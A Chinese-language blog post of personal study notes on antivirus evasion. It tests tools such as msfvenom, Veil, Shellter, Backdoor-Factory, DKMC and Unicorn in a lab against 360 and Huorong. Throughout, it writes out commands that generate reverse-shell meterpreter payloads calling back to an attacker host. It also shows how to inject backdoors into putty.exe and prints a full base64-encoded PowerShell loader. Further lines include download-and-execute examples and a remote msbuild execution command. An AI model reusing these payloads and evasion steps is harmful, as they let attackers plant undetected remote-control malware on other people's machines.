title: 免杀学习
author: bmth
tags:
  - 免杀
  - 学习笔记
categories: []
img: 'https://img-blog.csdnimg.cn/20210304213017221.png'
date: 2020-11-19 15:54:00
---
## 远控免杀专题
今天开始进行免杀学习，参考链接：
[https://github.com/TideSec/BypassAntiVirus](https://github.com/TideSec/BypassAntiVirus)
[免杀工具汇总](https://www.cnblogs.com/micr067/p/12519719.html)
>环境：windows7虚拟机，ip:192.168.50.224，安装360、火绒两款杀软，2020.11.20最新版本
kali虚拟机，ip:192.168.50.209
网络模式，桥接模式
### msf自免杀
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.50.209 LPORT=6666 -f exe -o payload.exe
```
使用频率最高的`windows/meterperter/reverse_tcp`，落地就没了。关闭杀软可正常上线
`handler -H 192.168.50.209 -P 6666 -p windows/meterpreter/reverse_tcp`
![](/bmth_blog/images/pasted-197.png)
[远控免杀专题文章(2)-msfvenom隐藏的参数 ](https://mp.weixin.qq.com/s/1r0iakLpnLrjCrOp2gT10w)
使用`msfvenom --list encoders`可查看所有编码器
![](/bmth_blog/images/pasted-194.png)
评级最高的两个encoder为`cmd/powershell_base64`和`x86/shikata_ga_nai`，其中`x86/shikata_ga_nai`也是免杀中使用频率最高的一个编码器
使用`x86/shikata_ga_nai`生成payload，参数`-i`为编码次数，我这里设置15次，并使用了`-b`参数去掉payload中的空字符。
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.50.209 LPORT=6666 -e x86/shikata_ga_nai -b "\x00" -i 15  -f exe -o payload.exe
```
![](/bmth_blog/images/pasted-195.png)
发现没有什么用，360和火绒都能查杀。
metasploit升级到了5.0，引入了一个新的模块叫Evasion模块，官方宣称这个模块可以创建反杀毒软件的木马
evasion有以下几个模块,可以使用`show evasion`进行查看
![](/bmth_blog/images/pasted-196.png)
使用`use windows/windows_defender_exe`进行生成payload
```bash
msf5 > use windows/windows_defender_exe
msf5 evasion(windows/windows_defender_exe) > set filename payload.exe
msf5 evasion(windows/windows_defender_exe) > set payload windows/meterpreter/reverse_tcp
msf5 evasion(windows/windows_defender_exe) > set LHOST 192.168.50.209
msf5 evasion(windows/windows_defender_exe) > set LPORT 6666
msf5 evasion(windows/windows_defender_exe) > run
```
用另外一个evasion模块`windows/windows_defender_js_hta`同样被两个杀软都杀掉了
![](/bmth_blog/images/pasted-207.png)
### Veil免杀
[安装Veil详细步骤](http://www.srcmini.com/14238.html)
[渗透利器Cobalt Strike - 第2篇 APT级的全面免杀与企业纵深防御体系的对抗](https://xz.aliyun.com/t/4191)
[免杀原理与实践——使用msfvenom与veil绕过杀毒软件](https://blog.csdn.net/wyf12138/article/details/79825833)
```
Veil>: use 1                   #选择Evasion功能
Veil/Evasion>: list            #查看payload列表
```
![](/bmth_blog/images/pasted-208.png)
推荐使用以go和ruby语言encode的编码方式。像python这类的与用户有较高的交互就容易被查杀
使用文章中免杀最好的来进行实验：**使用veil+mingw-w64**
```bash
# veil
use 1                        #选择使用 Veil-Evasion 模块
Veil-Evasion Menu
    41 payloads loaded
Available Commands:
    back            Go to main Veil menu
    checkvt         Check virustotal against generated hashes
    clean           Remove generated artifacts
    exit            Exit Veil
    info            Information on a specific payload
    list            List available payloads
    use             Use a specific payload
Veil-Evasion command: use 7        #选择payload  c/meterpreter/rev_tcp.py
[c/meterpreter/rev_tcp>>]: set LHOST 192.168.50.209
[c/meterpreter/rev_tcp>>]: set LPORT 6666
[c/meterpreter/rev_tcp>>]: generate
```
经过测试发现，静态全部被杀，然后我当着360的连接，可连接一会，随后360像反应了过来一样给杀了
![](/bmth_blog/images/pasted-209.png)
>veil功能还是很强大的，生成的shellcode自身免杀能力就不错，而且支持多种语言的shellcode编译打包，和msf及cs可以无缝对接，值得人好好研究一下。三大老牌免杀工具不是浪得虚名的~~
### Venom免杀
>Venom和Veil、Shellter是三大老牌免杀工具，免杀主要依靠分离执行和加密混淆等技术，可以和msf无缝对接
Venom利用msfvenom（metasploit）生成不同的格式的shellcode，如（c | python | ruby | dll | msi | hta-psh）等，然后将生成的shellcode注入一个模板（例如：python），并使用类似gcc、mingw32或pyinstaller之类的编译器生成可执行文件
Venom的一些功能还会直接调用`Veil-Evasion.py`，`unicorn.py`，`powersploit.py`等来直接创建免杀程序，避免重复造轮子

[利用meterpreter下的Venom免杀后门](https://www.cnblogs.com/wh4am1/p/7469625.html)
这里利用目标机的Powershell来反弹shell
```bash
Chose Categorie number:2
Chose Agent number:11 
```
然后填上ip，端口和木马名称，进行测试，发现火绒静态和动态都报毒。360静态没报，动态行为检测查杀出为风险程序，允许则msf正常上线
![](/bmth_blog/images/pasted-210.png)
后来上报过了一会发现360也查出为木马
>venom是一个综合性非常强大的工具，而且支持生成多平台payload，比如android、ios、linux/unix、office等等，我这里也只是简单演示了windows下的两个agent，其他还有很多agent模块免杀能力很强，比如18 shellter模块等等。
在venom生成编译的过程中可以看到他生成的shellcode其实是直接调用的msfvenom，而且在最后也可以和msf联动进行监听，还支持apache的web分发，很多模块都能和msf无缝对接，虽然被杀软盯的紧但免杀体验还是不错的。(果然被杀软盯得死死的)

### Shellter免杀
[kali 免杀工具shellter安装以及使用 ](https://www.cnblogs.com/hkleak/p/12912706.html)
工具安装完成后在`/usr/share/windows-resources/shellter`  这个文件夹
shellter目录下的`Shellter_Backups`文件夹是你注入文件后备份的文件夹，会自动把原文件备份一个到这个文件夹下。
```bash
Choose Operation Mode - Auto/Manual (A/M/H)：A              //选择模式 A自动模式自动注入后门，M高级模式，H帮助
PE Target：/mnt/hgfs/虚拟机共享文件夹/免杀/putty.exe         //注入的程序 这里选择32位的putty.exe
Enable Stealth Mode? (Y/N/H): Y                             //是否启用隐身模式 输入Y启用
Use a listed payload or custom? (L/C/H): L                  //使用攻击模块列表或者自定义 输入L 选择Payload
Select payload by index: 1                                  //选择第一个
```
![](/bmth_blog/images/pasted-211.png)
```bash
SET LHOST： 192.168.50.209    //设置反弹回来的IP 本机
SET LPORT： 6666             //设置接收反弹的端口
```
发现并没有免杀，两个都报毒
![](/bmth_blog/images/pasted-212.png)

>因为Shellter生成的shellcode是动态的，所以被查杀的几率也有所不同

### BackDoor-Factory免杀(过火绒)
[第九课：工具介绍-the-backdoor-factory](https://www.secshi.com/6090.html)
免杀原理：可执行二进制文件中有大量的00,这些00是不包含数据的,将这些数据替换成payload,并且在程序执行的时候,jmp到代码段,来触发payload
>backdoor-factory是把shellcode插入到一个正常的exe文件的代码"缝隙"中，类似于捆绑但不是捆绑，所以需要提前准备一个被捆绑的宿主exe文件，这是还是用之前的putty.exe为例
```bash
./backdoor.py -f /mnt/hgfs/虚拟机共享文件夹/免杀/putty.exe -S        //检测是否支持后门植入
```
![](/bmth_blog/images/pasted-213.png)
搜索该文件可用的Code Caves(代码缝隙)
`./backdoor.py -f /mnt/hgfs/虚拟机共享文件夹/免杀/putty.exe -c -l 600`          
```
-c：code cave(代码裂缝)
-l：代码裂缝大小
```
![](/bmth_blog/images/pasted-214.png)
发现3个可用代码缝隙,一般shellcode大小300字节，所以选择一个适当的缝隙就可以
获取该文件的可用payload
`./backdoor.py -f /mnt/hgfs/虚拟机共享文件夹/免杀/putty.exe -s -show`
![](/bmth_blog/images/pasted-215.png)
>`cave_miner_inline`：作为payload模板，长度为135，仅实现了控制流程跳转，不做其他操作，可用作自定义开发shellcode的模板
`reverse_shell_tcp_inline`：对应的msf：`use exploit/multi/handler set payload windows/meterpreter/reverse_tcp`
`meterpreter_reverse_https_threaded`：对应的msf：`use exploit/multi/handler set payload windows/meterpreter/reverse_https`
`iat_reverse_tcp_inline`中的iat：iat为`Import Address Table`(导入地址表)的缩写，如果PE文件的IAT不包含API LoadLibraryA和GetProcAddress，直接执行payload `reverse_shell_tcp_inline`会失败，`iat_reverse_tcp_inline`增加了修复IAT的功能，避免执行失败
`iat_reverse_tcp_stager_threaded`：增加了修复IAT的功能
`user_supplied_shellcode_threaded`：对应的msf：`use exploit/multi/handler set payload windows/meterpreter/reverse_tcp`自定义shellcode

生成payload：
`./backdoor.py  -f /mnt/hgfs/虚拟机共享文件夹/免杀/putty.exe -s iat_reverse_tcp_stager_threaded -H 192.168.50.209 -P 6666 -J -o payload.exe`
```
-s：选择使用 payload 类型
-H：选择回连服务器地址
-P：回连服务器端口
-J：使用多代码裂缝注入
```
我这里-J报错，不使用多代码裂缝注入
![](/bmth_blog/images/pasted-216.png)
最后发现360直接报毒，但火绒动静态都可以免杀，未检测到病毒
![](/bmth_blog/images/pasted-217.png)

>利用backdoor-factory使用，用户可以在不破坏原有可执行文件的功能的前提下，在文件的代码裂隙中插入恶意代码Shellcode。当可执行文件被执行后，就可以触发恶意代码。Backdoor Factory不仅提供常用的脚本，还允许嵌入其他工具生成的Shellcode，如Metasploit。
该工具还有很强大的一些其他功能，比如加私钥证书、CPT等等，虽然目前软件已经不再更新，但免杀效果至今依然不错也能管中窥豹看到它的强悍之处。

[利用BDF向EXE文件植入后门](https://3gstudent.github.io/3gstudent.github.io/%E5%88%A9%E7%94%A8BDF%E5%90%91EXE%E6%96%87%E4%BB%B6%E6%A4%8D%E5%85%A5%E5%90%8E%E9%97%A8/)
[后门免杀工具-Backdoor-factory](https://www.cnblogs.com/-qing-/p/11421709.html)

### Avet免杀
[【Blackhat】avet：杀软绕过工具使用教程 ](https://www.anquanke.com/post/id/86558)
[AntiVirus Evasion Tool(avet)测试分析](https://3gstudent.github.io/3gstudent.github.io/AntiVirus-Evasion-Tool(avet)%E6%B5%8B%E8%AF%95%E5%88%86%E6%9E%90/)
![](/bmth_blog/images/pasted-220.png)
我这里选择`build_kaspersky_fopen_shellrevtcp_win32.sh`进行测试
首先将lhost和lport改为自己本地ip和端口，随后运行sh脚本
`./build/build_kaspersky_fopen_shellrevtcp_win32.sh`
![](/bmth_blog/images/pasted-221.png)
生成一个exe文件，无杀软时正常上线。进行免杀测试，发现火绒和360都可以杀
>Avet提供了强大的自定义功能，在build文件夹下可以看到所有的payload生成脚本，很多参数都可以自己设定。Avet框架也是比较成熟的，可以轻松的进行二次开发，很容易能开发出来自己的专用免杀工具。

### TheFatRat免杀
[TheFatRat – 跨平台反弹后门Shell生成神器](http://caidaome.com/?post=198)
>在安装完成后，使用命令`fatrat`即可执行，启动略慢。TheFatRat和专题9里的Avet一样，也默认不允许远程连接后执行，只能在linux主机内执行。

下载了半天，终于下载好了，very good
![u](/bmth_blog/images/pasted-222.png)
常用创建后门菜单如下：
```
[01]  Create Backdoor with msfvenom 
#01：直接利用msf来生产后门，基本不能免杀

[02]  Create Fud 100% Backdoor with Fudwin 1.0
#02：使用Fudwin 1.0创建powershell后门，ps1利用powerstager混淆，从结果来看效果不错

[03]  Create Fud Backdoor with Avoid v1.2  
# 03: 使用Avoid v1.2创建后门

[04]  Create Fud Backdoor with backdoor-factory [embed] 
#04：使用backdoor-factory创建后门

[05]  Backdooring Original apk [Instagram, Line,etc] 
#05：生成安卓使用的apk后门

[06]  Create Fud Backdoor 1000% with PwnWinds [Excelent] 
#06：综合了多种方式，可生成bat、exe、dll、ps1等，可利用c、C#多种语言编译，官方非常推荐，但经尝试免杀效果一般，肯定是被杀软列入特征库了

[07]  Create Backdoor For Office with Microsploit 
#07：生成office类后门

[08]  Trojan Debian Package For Remote Access [Trodebi]
#08：生成linux后门
```
这里也使用02来进行测试，选择`[ 1 ] - Powerstager 0.2.5 by z0noxz (powershell) (NEW)`，发现报错了，根据报错信息修改即可
进过测试发现，火绒静态查杀没查出来，不过行为检测查杀到了。360静态和动态都能查杀。
![](/bmth_blog/images/pasted-223.png)
>TheFatRat创建的后门格式和支持的平台比较多样化，而且还支持生成CDROM/U盘中能自动运行(生成AutoRun文件)的后门文件，并且可以对payload更改图标，具有一定伪装效果。
TheFatRat的很多免杀方式是借助于msfvenom编码、upx等加壳压缩、c/c#编译等将powershell混淆后编译成exe或bat文件，但有些在执行时还是会调用powershell，而powershell的调用已经被各大杀软盯的很紧了，所以查杀效果只能算是一般了。

### Green-Hat-Suite免杀
作者提供的使用说明：[https://github.com/Green-m/green-hat-suite/wiki/Use-green-hat-suite](https://github.com/Green-m/green-hat-suite/wiki/Use-green-hat-suite)
进入Green-Hat-Suite文件夹，执行`ruby greenhat.rb`即可使用
![](/bmth_blog/images/pasted-224.png)
默认生成即可，发现360和火绒动静态都能查杀
>因为Green-Hat-Suite使用了多种方式对shellocde进行处理，所以导致每次生成的shellcode都不同，被查杀的概率也不一样。
Green-Hat-Suite调用了msfvenom进行随机编码生成shellcode，然后Green-Hat-Suite对shellcode进行多重免杀处理混淆，并最终编译生成不同的exe后门文件。虽然原理不算复杂，但两年前的作品，至今来说免杀效果仍很不错。

### zirikatu免杀
```bash
chmod +x zirikatu.sh
./zirikatu.sh
```
![](/bmth_blog/images/pasted-225.png)
使用最常规的reverse_tcp进行测试,选项都比较简单，默认填写即可
![](/bmth_blog/images/pasted-226.png)
最后发现360和火绒都过不了，啊这，很失望

### AVIator免杀
官方文档：[https://github.com/Ch0pin/AVIator](https://github.com/Ch0pin/AVIator)
>AVIator使用AES加密来加密Shellcode，生成一个包含加密有效负载的可执行文件，然后使用各种注入技术将shellcode解密并注入到目标系统，从而绕过杀毒软件的检测。

AVIator只有windows版，c#开发，单文件exe
首先要使用msf生成shellceode，需要基于c#，我就用msf生成一个最基础的：
`msfvenom -p windows/meterpreter/reverse_https  LHOST=192.168.50.209 LPORT=6666  -f csharp -o test.c`
在AVIator中对shellcode进行处理，AES KEY和IV默认就可以，payload地方填入上面生成的test.c文件内容，然后点击`Encrypt`，生成加密后的payload
目标操作系统架构根据实际情况选择就可以，x86比较通用一些
下面还有个`Injection Techniques`，需要选择注入技术，我这选择第二个注入Notepad++进程
![](/bmth_blog/images/pasted-227.png)
发现360和火绒都报毒，免杀失败。

### DKMC免杀(过360)
[https://github.com/Mr-Un1k0d3r/DKMC](https://github.com/Mr-Un1k0d3r/DKMC)
>DKMC是一种生成混淆的shellcode的工具，并把shellcode合成到图像文件中，最终依靠PowerShell执行最终的shellcode有效负载。

执行`python dkmc.py`即可运行
![](/bmth_blog/images/pasted-228.png)
看到5个选项，翻译后为
```
[*] (gen)	将msf的shellcode注入到一个BMP图像
[*] (web)	启动web服务用来分发BMP图像
[*] (ps)	生成ps的payload
[*] (sc)	将msf生成的raw文件转为shellcode
[*] (exit)	退出
```
>生成一个后门的流程大体为：
1、先利用msf生成raw文件
2、利用sc将raw文件转换为shellcode
3、利用gen将上一步的shellcode注入到一个BMP图像
4、利用ps生成基于powershell的BMP文件的payload
5、利用web提供的简单web服务进行分发BMP文件

1、先利用Msf生成raw格式的shellcode，稍微编码了一下
```bash
msfvenom -p windows/meterpreter/reverse_https  LHOST=192.168.50.209 LPORT=6666 -e x86/shikata_ga_nai -b "\x00" -i 5 -a x86 -f raw -o test.raw
```
![](/bmth_blog/images/pasted-229.png)
2、在主菜单中选择`sc`,然后设置`set source /root/test.raw`,再执行run生成shellcode
![](/bmth_blog/images/pasted-230.png)
复制一下生成的shellcode,输入exit退回到主菜单
3、在主菜单中选择`gen`,然后设置`shellcode`为上一步中生成的shellcode
![](/bmth_blog/images/pasted-231.png)
看到生成了`output-1606825797.bmp`图像文件，输入exit退回到主菜单
4、在主菜单中选择`ps`,设置url地址，这个url地址就是web分发图像文件的地址
使用默认的80端口，使用命令`set url http://192.168.50.209/output-1606825797.bmp`，然后执行`run`生成powershell执行脚本
![](/bmth_blog/images/pasted-232.png)
复制一下生成的`ps`代码，输入exit退回到主菜单
5、在主菜单中选择`web`,使用默认80端口，执行run即可
![](/bmth_blog/images/pasted-233.png)
6、在测试机器上执行第4步生成的ps代码，发现我这里https不成功，使用tcp来测试，没有杀软的情况下可正常上线
```cmd
powershell.exe -nop -enc JABqAHYAQwBsAHkAagBHACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBNAGUAbQBvAHIAeQBTAHQAcgBlAGEAbQAoACwAWwBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAiAEgANABzAEkAQwBMAFEAOAB4AGwAOABDAC8AegBFADIATQBEAFkANABNAGoAYwB4AE8ARABnAHUATQB6AEUAIQB0AFYAWgB0AFQAKwBNADQARQBQADYATwB4AEgAKwB3AFYAcABHAFMAUwBHAGwAbwB5AHgANwBIAEkAcQAxAEUASwBTAC8AYgBQAFEAbwBWAG8AWABCADMAMwBXAHIAbABKAHQAUABXAFgAYwBkAE8ASABhAGYAUQBYAGYAagB2AE4AOAA0AEwATABVAGUANQBZADMAVwA2AGYARwBsAHQAegA0AHoASAB6AHoAUAB6ADIAQgBiADkANwBaAHgAOABKAEkAZgAyADkAdABZADQARQA2AEYAbQBVAHAARABaAHkAZQBjAFoAKwBiAEcAOQBSAGMAcQB2AFIAeABXAE4AaQBXAE0AdABxAFAAbwBhAHkAeQBqAGoANABKAEYAOABrAEMAZwBaAFEAcABRAHAAYwBGAGYARwBWAGgAUgBNADQAdgA2AGMAWQBWAEIAbgAwAEUAcQBTAFkAeABsAFQASgBvAFkASABCACsAMQBNAEsAUgBDADYARwBQAHQAbgBvAEYAdABwAEMAdgBHAEkATQAwAGcAZABsAHoAeQBRADIAeQBrAG8AcQBGADIATwBaAGgAQgBxADgAbwBOAFkAWAAvADAAegBMAGsAZQBVAGwAMgBiAEwATgBnADIAbgBRAEcAbwB0AEUAWgBtADEAYwB4AGwAUwBrADYAdwBmAEoASgB4AHAAeAAvADcAeQB4AFgAWQBIAHQAYwBiAFEAUAA1AGwAbgBsAEsAZQBPAEgAUwB4AFQARABiAEUAZgBjAFcANgA3ADUATgBFADEARwAxADQAdgBFADMARABzAEwAZwB1AFYAVABPAFYAWQArADcAZABNADcARABiADkAdgBrAGoAcABHAEMANAB3ADIAZwBLADYAbwBLAGMAeQBTAG0AMAA4AHoAKwBwAEUAQwBuAFMAbQB4AE4AUABCAFQASwBUAEMAegByAEgAeABiAHcAOAB4AGEARQBXAFIAZwBoAFQAZAAvAEkANQBZAHkARwAvAGcAVwBDAEwAagAzAEMATwBIAHoAcQBCAE0ANAB5AG8AVABtAHMAVwAhADYAeABxAFUAVAAhAEoAUQBDAHgAWgBDADYAbgArAGkASQB1AEoAdwBCAGUATwBoAGMAdwBGADMAMQBlAG4AZgA2AHUAUwBzAE8ANgBGAFYAVAB5AHYAWABRADYASQAyAFoAOQByAE4AcQBTAHUAYwBiAGYAZABsAHIAbQB2ADgAdQB2AGkAOQA0AEIAaABCAGUAVABTADQAUABOAFYASgAzAEwAbQArAGwAQwBMAGMAVQBDAHEAcgBpAGUAbwBiADUAQwB1ACEAQgAzAEYANgBNAG0AVwA1AC8AMABkAFMAOQAwAGcAWAA4ADYARgBhAHEAaQBVAE8AcgBXAHUAVgBnAFQAcwBrACEAOABQAFUAWQBEAGcAawBsAHUAcgBOACsAeQBmAGUAVwA4AE0AMQBLAGwALwAwAHoARwBRADQAKwBUADYAOQBNADMAVQA0AHUASgBFAHMARwBxADYAQwBQAEcAUABYAE8AdQByAGYAaQBLADYAeABlAHIAMQBZAGoAMgBIAE0AQgBCAHcAdgBCAFkAMQBaAFcATgBXAGoAcwA0AGsAeABHAEgAUABJAHcAZgBFAHIAcwB3AHQATQAwADcASABMAEIAWQBpAE8AZwBjAE8ARQBhAGsATwAhAFIAdwBZAHYAMwBVADUAaQBwAHAAOQA4AGoAegBMAEcASQAxAEMAdABFAEYAbABQAE0AUwBzAHMAQwBQAGQANQBNAGcAVwBuAGoAdAAwAFIAWABZAGcAUgB4AEcASgBzAEkAMwBkAGoANwAhAEsAbwByAE0AdgBLAFgAMQBhADcAbQB6AEUAYQAyAFcAMQBPADAAOQBRAGoAdgBRAHoAYgBNAFAAUgBJACEASgBSAEQANQBKAEcAVwBTAEYAbQA1ADEATQBxADAAegBQAC8AYQBxADMAUwA3AEcAZABjAHMAcABLAG0AdQB3AGcAMwBkAHYAKwBOAFoANwB0AHUAVwBJAHQAVQBxAEMANQBGAGYAeABPACEANgBTAEMAQgBrAGwAQgB0AEkAUABQAEsASgBSAFgAQwAwAEQATgBpAGsAMgB0AC8AZQBDAEUAaQBiAGMAcwA3AEUAQgBDAE0AdABrAEIAQwBjAE0AVQAhAEUAMgBsAFMATgB3AGwAUwBMAEMAbgBIADkAIQBIAFEAbgBUAGoAagBFAGEASgBRAEwAdwB5AG0AbgBFADUAUwBCAHMAbwBmAHkATwBxAE0AVABpAE8AegBYAFUAcQAwAGEAcABlAGcASwAhADAANgBGAHkAbABxAGkAeQBIAGoAIQBwAGYAYgBJAEQAVgBNAGEAZABjAFkAIQBYAFIAWABhAGYAOAB1AGwARQBwAGsAaQBwAGIAYQBDAGsAaQBXAG4ANgBMAG8ASwBtACEAdAAhADIAWQBMAFIARgBjAHcAegBTAEQAVQBpAGcAYwBsAFQAcAAhAFAAbgBVAEkAagB1AGwAOABZAHoATQBqAGcAaAArADYAYQBtADEAOQB4AFcASwA3AG0AUwByAG4AegBYAFgASABDAGoAbwA2AFUAMgByAFcAZAAxADQAOABCADAAeABZAFkAaQBMADMATgBvAG8AMwBJAEwAagBSAFUAbQA3AHcAUwBYAE4ARABxAG0AbQBqAHIAdgBwAGwAbwBuAEIAegBzADcAagBRADkATgB2ADcARwAzADcALwA5AFMAOQA1AHYAMQBEAHoAcwB5ADAAMABtAG0AYQA0ADIAOQArAHQANQArADgAOQBkAEcAdgBlAEcAUAA0AHUAUgBkADMAbwBmAFcAVwBhAC8AUABPAFYAOQBMADkAagBYAFoANgAxAEsAVgBUAGkAbgBIAHgARgBIAE0AcQB0AEkANwBsAGUAcQAwADEASwBPAGUAWgBNAGIARABjAGYATAA3ADYAeABzAG8AIQBSAHoAMQBIAFcAKwAhAGkAcQA0AFcANQB6AEkAMABDAGwAawBwAEYAdwBwADAASQBaAHQARAByAEwAMAArAC8AdAAxAHQAYgB2AHoAbgBrAGkAZABEAGQANgBXAGMAMQBkAFQAQgB3AFoAKwBZAEsAUABKAHYATQBQAFAAUABRAFUAegAwADEASwB2AGYANwA5AGIAcgBxAEcALwAxACsALwBkADEAZAAwAFgAZwB2AHgAKwB1AEwAWgBPAGwAawA0AGYAeQBqAEQANgBXACsARgBUAFIAZQBSADYAOQBRAEMANQBhAFgAawA2AE8ALwByAGgASgAvAGwALwBzAHkAbABxAGMANABrAC8AMABCAHUAeABXAGMALwArAHcAKwBpAFkAOAA2ADEANQAxADkAaABjAEwAegB5AGQAKwBDAHQANgBmAFAAdgA4AHQAWgBSAG8AdAAhAHgAUQBoAEQAawBVAG4AdgAhAHAARABXAFMAMQByAGwAMgB2AEYARQBkAGIARAB1AFAAegBNAFkAKwBjAFMAdQArAEUAQwA3ADkAMwB0AEwAZgB2AFEAYwBOAGsAWgBrADcAWABqAHAAKwB3ADcAdgBuAFIAZwBUAHYAYgBkADkAYwBzADEAMQBWAFQAcAAyAGsAeQBPADgASABtAFUAbQBQAHYAUABzAFQAcQBkACsAVwB3AEIATAB1AG0AYwAvAEUANwBLACEAWABrAGsATgBZAFMAaABsAGUANAAyADgAYgBXAGsASgBwAG0AUgBJAFcASwBaAGQAOQA0AEQAdQBjAFAARAA1AEIARQBlAHkAQgBXAEUAZwBFACsAZQAyAG0AYwA1AHkAaQBVAEcAOABMADUAWQAzAHkAMABQAGkAVgA3ADUANABsACsAWAB0AE4AQwBRAEoAdwBvACEAIQAhAD0APQAiAC4AUgBlAHAAbABhAGMAZQAoACIAIQAiACwAIAAiAEEAIgApACkAKQA7ACAAJABBAGIATwBwACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAFMAdAByAGUAYQBtAFIAZQBhAGQAZQByACgATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEcAegBpAHAAUwB0AHIAZQBhAG0AKAAkAGoAdgBDAGwAeQBqAEcALABbAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgBNAG8AZABlAF0AOgA6AEQAZQBjAG8AbQBwAHIAZQBzAHMAKQApACkALgBSAGUAYQBkAFQAbwBFAG4AZAAoACkAOwAgAFsAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAF0AOgA6AEMAcgBlAGEAdABlACgAJABBAGIATwBwACkALgBJAG4AdgBvAGsAZQAoACkACgA=
```
有杀软的情况下火绒会进行报警，360则没有反应，可正常上线
![](/bmth_blog/images/pasted-234.png)
>DKMC主要把shellcode注入到bmp图像中，然后使用powershell来执行其中的shellcode，但是很多杀软都会监测powershell的执行动作，所以virustotal.com的静态检测不足以说明什么。其实还可以进一步对ps执行代码进行混淆免杀

### Unicorn免杀(过火绒)
>Magic Unicorn是一个比较简单的小工具，主要是基于Matthew Graeber提出的PowerShell攻击技术以及David Kennedy和Josh Kelly 提出的powershell bypass技术，把所有payload都转换成powershell代码。
Magic Unicorn支持cobalt strike、Metasploit和自定义的shellcode。

执行`python unicorn.py`即可，可以使用`python unicorn.py --help`命令查看详细帮助
主要的几个用法如下：
```
Usage: python unicorn.py payload reverse_ipaddr port <optional hta or macro, crt>
PS Example: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443
PS Down/Exec: python unicorn.py windows/download_exec url=http://badurl.com/payload.exe
PS Down/Exec Macro: python unicorn.py windows/download_exec url=http://badurl.com/payload.exe macro
Macro Example: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 macro
Macro Example CS: python unicorn.py <cobalt_strike_file.cs> cs macro
HTA Example: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 hta
HTA SettingContent-ms Metasploit: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 ms
HTA Example CS: python unicorn.py <cobalt_strike_file.cs> cs hta
HTA Example SettingContent-ms: python unicorn.py <cobalt_strike_file.cs cs ms
HTA Example SettingContent-ms: python unicorn.py <patth_to_shellcode.txt>: shellcode ms
DDE Example: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 dde
CRT Example: python unicorn.py <path_to_payload/exe_encode> crt
Custom PS1 Example: python unicorn.py <path to ps1 file>
Custom PS1 Example: python unicorn.py <path to ps1 file> macro 500
Cobalt Strike Example: python unicorn.py <cobalt_strike_file.cs> cs (export CS in C# format)
Custom Shellcode: python unicorn.py <path_to_shellcode.txt> shellcode (formatted 0x00 or metasploit)
Custom Shellcode HTA: python unicorn.py <path_to_shellcode.txt> shellcode hta (formatted 0x00 or metasploit)
Custom Shellcode Macro: python unicorn.py <path_to_shellcode.txt> shellcode macro (formatted 0x00 or metasploit)
Generate .SettingContent-ms: python unicorn.py ms
```
支持生成ps1、macro、hta、dde等形式的代码和文件，这里使用最常规的`windows/meterpreter/reverse_tcp`来生成payload
`python unicorn.py windows/meterpreter/reverse_tcp 192.168.50.209 6666`
![](/bmth_blog/images/pasted-235.png)
生成了两个文件`powershell_attack.txt`和`unicorn.rc`两个文件。一个是msf的配置文件，一个是生成的payload，用`msfconsole -r unicorn.rc`命令可以快捷的启动msf并监听相应端口
在windows10本机上执行`powershell_attack.txt`里的代码
发现免杀火绒
![](/bmth_blog/images/pasted-236.png)
360报风险程序。使用bat2exe生成的exe也是如此
![](/bmth_blog/images/pasted-237.png)

>Unicorn使用比较简单，可以生成powershell代码、macro宏代码、hta、dde等格式的payload文件，可以在社工时直接使用，不过因为生成的代码关键字比较明显，所以静态查杀很多都没通过，只能说生成代码多样但免杀效果一般

### ASWCrypter免杀
[https://github.com/abedalqaderswedan1/aswcrypter](https://github.com/abedalqaderswedan1/aswcrypter)
>ASWCrypter是2018年开源的免杀工具，原理比较简单，使用msf生成hta代码，然后使用python脚本对hta代码进行一定编码处理，生成新的hta后门文件，从而达到免杀效果。

执行`./ASWCrypter.sh`，选择G，第一步也只有这个能选
![](/bmth_blog/images/pasted-238.png)
随后填入ip和端口，后门payload,选择最常规的`reverse_tcp`，随后即可生成.hta文件
![](/bmth_blog/images/pasted-239.png)
没杀软时可以正常上线，测试一下能否免杀，发现火绒和360静态和动态都能查杀，不太行
>ASWCrypter是使用msfvenom生成基于powershell的hta后门文件，然后进行编码处理，达到一定的免杀效果，不过因为会调用powershell，行为检测还是很容易被检测出来。

### nps_payload免杀(过360)
>`nps_payload`是2017年开源的工具，安装使用都比较简单,`nps_payload`可以生成基于msbuild的xml文件和独立执行的hta文件，并对xml文件和hta文件做了一定的混淆免杀，从而达到免杀的效果。

`python nps_payload.py`即可运行
![](/bmth_blog/images/pasted-240.png)
>nps_payload生成的xml或hta文件都需要使用msbuild来执行。
Microsoft Build Engine是一个用于构建应用程序的平台，此引擎也被称为msbuild，它为项目文件提供一个XML模式，该模式控制构建平台如何处理和构建软件。Visual Studio使用MSBuild，但它不依赖于Visual Studio。通过在项目或解决方案文件中调用msbuild.exe，可以在未安装Visual Studio的环境中编译和生成程序。
说明：Msbuild.exe所在路径没有被系统添加PATH环境变量中，因此，Msbuild命令无法直接在cmd中使用。需要带上路径：`C:\Windows\Microsoft.NET\Framework\v4.0.30319`。
适用条件:`.NET Framework>=4.0`

首先选择1，`Generate msbuild/nps/msf payload`，第2步payload选择1，`windows/meterpreter/reverse_tcp`，后面输入监听IP和端口
![](/bmth_blog/images/pasted-241.png)
文件的执行方式有两种：
```bash
a. Local File Deployment:
    - %windir%\Microsoft.NET\Framework\v4.0.30319\msbuild.exe <folder_path_here>\msbuild_nps.xml
b. Remote File Deployment:
    - wmiexec.py <USER>:'<PASS>'@<RHOST> cmd.exe /c start %windir%\Microsoft.NET\Framework\v4.0.30319\msbuild.exe \\<attackerip>\<share>\msbuild_nps.xml
```
